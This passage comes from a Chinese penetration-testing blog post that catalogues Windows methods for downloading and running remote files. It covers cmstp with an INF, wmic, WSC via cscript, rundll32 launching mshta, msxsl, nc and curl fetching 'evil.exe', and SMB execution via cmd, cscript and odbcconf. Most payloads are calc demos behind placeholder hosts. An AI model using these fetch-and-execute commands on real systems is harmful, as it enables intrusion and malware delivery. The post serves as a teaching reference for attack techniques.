+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821135750174.png" alt="image-20200821135750174"></p>
+<h4 id="CMSTP"><a href="#CMSTP" class="headerlink" title="CMSTP"></a>CMSTP</h4><p>​    使用cmstp加载本地的inf文件，inf中再去加载远程的sct文件。</p>
+<p>inf中的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature&#x3D;$chicago$</span><br><span class="line">AdvancedINF&#x3D;2.5</span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">UnRegisterOCXs&#x3D;UnRegisterOCXSection</span><br><span class="line">[UnRegisterOCXSection]</span><br><span class="line">%11%\scrobj.dll,NI,http:&#x2F;&#x2F;10.0.0.2&#x2F;tmp&#x2F;powersct.sct</span><br><span class="line">[Strings]</span><br><span class="line">AppAct &#x3D; &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName&#x3D;&quot;Pentestlab&quot;</span><br><span class="line">ShortSvcName&#x3D;&quot;Pentestlab&quot;</span><br></pre></td></tr></table></figure>
+
+<p>​        再使用如下命令加载inf文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe &#x2F;s xxx.inf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821140228440.png" alt="image-20200821140228440"></p>
+<p>​        使用这种方式加载并执行远程的文件有个缺陷，就是会在执行的目录下生成一个快捷方式文件还有一个cmp文件。</p>
+<h4 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h4><p>​        使用wmic可以加载并执行远程的xsl文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process get brief &#x2F;format:&quot;http:&#x2F;&#x2F;xxx:8080&#x2F;launcher.xsl&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821140727620.png" alt="image-20200821140727620"></p>
+<h4 id="WCS"><a href="#WCS" class="headerlink" title="WCS"></a>WCS</h4><p>​        首先创建一个js文件，文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(&quot;script:http:&#x2F;&#x2F;xxxx:8011&#x2F;test.wsc&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>​        使用cscript执行js文件，加载并执行远程的wsc文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csript  1.js</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821141107404.png" alt="image-20200821141107404"></p>
+<p>​        wsc文件中的内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;    </span><br><span class="line">&lt;package&gt;</span><br><span class="line">&lt;component id&#x3D;&quot;testCalc&quot;&gt;    </span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;    </span><br><span class="line">&lt;&#x2F;component&gt;</span><br><span class="line">&lt;&#x2F;package&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h4><p>​        rundll32本身并不能达到加载并且运行远程文件的目的，不过可以配合其他方式来下载远程文件并执行</p>
+<p>比如可以加载hta文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;C:&#x2F;Windows&#x2F;System32&#x2F;mshta.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.hta&quot;,0,true);self.close();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821141739314.png" alt="image-20200821141739314"></p>
+<h3 id="非自带程序"><a href="#非自带程序" class="headerlink" title="非自带程序"></a>非自带程序</h3><h4 id="msxsl"><a href="#msxsl" class="headerlink" title="msxsl"></a>msxsl</h4><p>​        msxsl.exe可以去加载远程的xsl文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.xsl  http:&#x2F;&#x2F;xx.xxx.xx.xx:8011&#x2F;test.xsl</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821142928346.png" alt="image-20200821142928346"></p>
+<p>​        xsl文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">	&lt;ms:script implements-prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>​        首先在自己的服务端执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444 &lt; evil.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821145912928.png" alt="image-20200821145912928"></p>
+<p>​        在客户端执行下面的命令进行文件下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  xxxxx 4444 &gt;evil.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821150020632.png" alt="image-20200821150020632"></p>
+<h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>​        有些主机上安装了curl，因此也可以使用curl进行文件下载操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;xxx:1234&#x2F;evil.exe -o test123123.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821150327583.png" alt="image-20200821150327583"></p>
+<h4 id="chfs"><a href="#chfs" class="headerlink" title="chfs"></a>chfs</h4><p>​        这款工具可以在主机上开启一个web服务，我们可以通过这个web服务对主机上的文件进行增删改查，这个方式比较适合在内网去使用。</p>
+<p>​        上传到目标主机，在某个目录下执行这个文件，即可将当前目录共享出去</p>
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821155948134.png" alt="image-20200821155948134"></p>
+<p>​        在web下访问，即可对目录下的文件进行操作。</p>
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821160044054.png" alt="image-20200821160044054"></p>
+<h3 id="SMB协议下载"><a href="#SMB协议下载" class="headerlink" title="SMB协议下载"></a>SMB协议下载</h3><h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\jerry\Desktop\test666.inf \\192.168.3.144\c$\windows\temp\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821164751755.png" alt="image-20200821164751755"></p>
+<h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p>​        使用这种方式可以在本地加载远程的文件执行 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;k \\192.168.3.144\c$\windows\temp\calc.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821165453771.png" alt="image-20200821165453771"></p>
+<h4 id="cscript"><a href="#cscript" class="headerlink" title="cscript"></a>cscript</h4><p>​        使用这种方式可以加载远程的js并且执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript  \\192.168.3.144\c$\windows\temp\test.js</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821170207437.png" alt="image-20200821170207437"></p>
+<h4 id="Odbcconf"><a href="#Odbcconf" class="headerlink" title="Odbcconf"></a>Odbcconf</h4><p>​        使用这种方式可以加载远程的dll进行执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odbcconf.exe &#x2F;a &#123;regsvr \\192.168.3.144\c$\windows\temp\test.dll&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821172655915.png" alt="image-20200821172655915"></p>
+<p>​        需要注意编译的dll的版本要和windows的版本相对应。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        关于windows下文件下载的方式先总结这么多，这些文件下载方式的种类虽然非常多，还是要选择适合自己当前环境的方式来选择对应的方法利用。</p>
+<p><strong>参考文章</strong></p>
+<p><a href="https://evi1cg.me/archives/remote_exec.html" target="_blank" rel="noopener">windows命令执行漏洞不会玩？ 看我！</a></p>
+<p><a href="https://payloads.online/archivers/2017-11-08/1#0x02-ipc" target="_blank" rel="noopener">Windows下命令行下载文件总结</a></p>
+<p><a href="https://xz.aliyun.com/t/7937#toc-3" target="_blank" rel="noopener">windows/Linux文件下载方式汇总</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93-windows/" rel="tag"># 文件传输 windows</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/10/%E5%85%B3%E4%BA%8E%E6%B8%97%E9%80%8F%E7%BB%8F%E5%85%B8%E6%A1%88%E4%BE%8B%E7%9A%84%E6%80%9D%E8%80%83/" rel="prev" title="关于渗透经典案例的思考">
+      <i class="fa fa-chevron-left"></i> 关于渗透经典案例的思考
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/08/21/%E5%85%B3%E4%BA%8Ehw%E6%89%93%E7%82%B9%E7%9A%84%E6%80%9D%E8%80%83/" rel="next" title="关于hw打点的思考">
+      关于hw打点的思考 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#下载任意格式文件"><span class="nav-number">1.</span> <span class="nav-text">下载任意格式文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#powershell"><span class="nav-number">1.1.</span> <span class="nav-text">powershell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#certutil"><span class="nav-number">1.2.</span> <span class="nav-text">certutil</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bitsadmin"><span class="nav-number">1.3.</span> <span class="nav-text">bitsadmin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vbs"><span class="nav-number">1.4.</span> <span class="nav-text">vbs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#js"><span class="nav-number">1.5.</span> <span class="nav-text">js</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#certreq"><span class="nav-number">1.6.</span> <span class="nav-text">certreq</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python"><span class="nav-number">1.7.</span> <span class="nav-text">python</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FTP"><span class="nav-number">1.8.</span> <span class="nav-text">FTP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#下载指定格式文件"><span class="nav-number">2.</span> <span class="nav-text">下载指定格式文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#msiexec"><span class="nav-number">2.1.</span> <span class="nav-text">msiexec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mshta"><span class="nav-number">2.2.</span> <span class="nav-text">mshta</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#regsvr32"><span class="nav-number">2.3.</span> <span class="nav-text">regsvr32</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CMSTP"><span class="nav-number">2.4.</span> <span class="nav-text">CMSTP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wmic"><span class="nav-number">2.5.</span> <span class="nav-text">wmic</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WCS"><span class="nav-number">2.6.</span> <span class="nav-text">WCS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rundll32"><span class="nav-number">2.7.</span> <span class="nav-text">rundll32</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#非自带程序"><span class="nav-number">3.</span> <span class="nav-text">非自带程序</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#msxsl"><span class="nav-number">3.1.</span> <span class="nav-text">msxsl</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nc"><span class="nav-number">3.2.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#curl"><span class="nav-number">3.3.</span> <span class="nav-text">curl</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#chfs"><span class="nav-number">3.4.</span> <span class="nav-text">chfs</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB协议下载"><span class="nav-number">4.</span> <span class="nav-text">SMB协议下载</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IPC"><span class="nav-number">4.1.</span> <span class="nav-text">IPC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CMD"><span class="nav-number">4.2.</span> <span class="nav-text">CMD</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cscript"><span class="nav-number">4.3.</span> <span class="nav-text">cscript</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Odbcconf"><span class="nav-number">4.4.</span> <span class="nav-text">Odbcconf</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">藏青</p>
+  <div class="site-description" itemprop="description">知行合一</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">藏青</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
